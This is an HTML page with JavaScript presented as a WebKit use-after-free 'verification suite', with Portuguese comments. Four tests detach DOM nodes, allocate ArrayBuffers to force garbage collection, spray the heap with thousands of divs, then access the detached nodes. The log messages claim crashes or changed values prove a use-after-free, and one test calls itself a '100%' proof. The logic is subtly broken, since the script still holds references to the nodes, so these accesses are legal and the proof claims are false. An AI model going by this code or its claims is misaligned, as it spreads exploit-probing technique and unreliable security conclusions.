
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>WebKit UAF Verification Suite</title>

</head>
<body>

<h2>WebKit – UAF Verification Suite</h2>

<button onclick="testA_BackingReuse()">TESTE A – Backing Reuse</button>
<button onclick="testB_VirtualCall()">TESTE B – Método Virtual</button>
<button onclick="testC_SelectionLayout()">TESTE C – Selection/Layout</button>
<button onclick="testD_Minimal()">TESTE D – Minimal Proof (100%)</button>

<div id="log"></div>

<script>
function log(m) {
  logEl.textContent += m + "\n";
  logEl.scrollTop = logEl.scrollHeight;
}
const logEl = document.getElementById("log");

function forceGC() {
  let tmp = [];
  for (let i = 0; i < 50000; i++)
    tmp.push(new ArrayBuffer(1024));
  tmp = null;
}

// ==========================================================
// TESTE A – BACKING STORE REUSE
// ==========================================================
function testA_BackingReuse() {
  log("\n[TEST A] Backing Store Reuse");

  let victim = document.createElement("div");
  victim.id = "victimA";
  victim.textContent = "AAAA";
  document.body.appendChild(victim);

  document.body.removeChild(victim);

  forceGC();

  // Heap grooming: criar muitos DIVs
  let spray = [];
  for (let i = 0; i < 20000; i++) {
    let d = document.createElement("div");
    d.textContent = "BBBB" + i;
    spray.push(d);
  }

  try {
    let txt = victim.textContent;
    let id = victim.id;
    log("[A] Access after free: text=" + txt + " id=" + id);
  } catch (e) {
    log("[A] Exception: " + e);
  }

  log("[A] Se text/id mudarem ou crashar → UAF confirmado");
}

// ==========================================================
// TESTE B – MÉTODO VIRTUAL PÓS-GC
// ==========================================================
function testB_VirtualCall() {
  log("\n[TEST B] Virtual Method After GC");

  let victim = document.createElement("span");
  document.body.appendChild(victim);
  document.body.removeChild(victim);

  forceGC();

  try {
    // chamadas nativas profundas
    let p = victim.compareDocumentPosition(document.body);
    log("[B] compareDocumentPosition returned: " + p);
  } catch (e) {
    log("[B] Exception: " + e);
  }

  try {
    let c = victim.cloneNode(true);
    log("[B] cloneNode success: " + c.nodeName);
  } catch (e) {
    log("[B] cloneNode exception: " + e);
  }

  log("[B] Crash / retorno impossível = UAF real");
}

// ==========================================================
// TESTE C – SELECTION / LAYOUT (CLÁSSICO)
// ==========================================================
function testC_SelectionLayout() {
  log("\n[TEST C] Selection/Layout UAF");

  let victim = document.createElement("p");
  victim.textContent = "UAF-TEST";
  document.body.appendChild(victim);

  let r = document.createRange();
  r.selectNodeContents(victim);

  document.body.removeChild(victim);

  forceGC();

  try {
    // toca layout/selection após free
    let sel = window.getSelection();
    sel.removeAllRanges();
    sel.addRange(r);
    log("[C] Selection applied to removed node");
  } catch (e) {
    log("[C] Exception: " + e);
  }

  log("[C] Crash aqui é prova forte (UAF histórico)");
}

// ==========================================================
// TESTE D – MINIMAL PROOF (100%)
// ==========================================================
function testD_Minimal() {
  log("\n[TEST D] Minimal UAF Proof");

  let victim = document.createElement("div");
  victim.innerHTML = "<b>TEST</b>";
  document.body.appendChild(victim);

  let ref = victim.firstChild;

  document.body.removeChild(victim);
  victim = null;

  forceGC();

  try {
    // acesso cruzado profundo
    let name = ref.parentNode;
    let html = ref.ownerDocument;
    log("[D] parentNode=" + name + " ownerDocument=" + html);
  } catch (e) {
    log("[D] Exception: " + e);
  }

  log("[D] Crash, freeze ou comportamento impossível = PROVA FINAL");
}
</script>

</body>
</html>
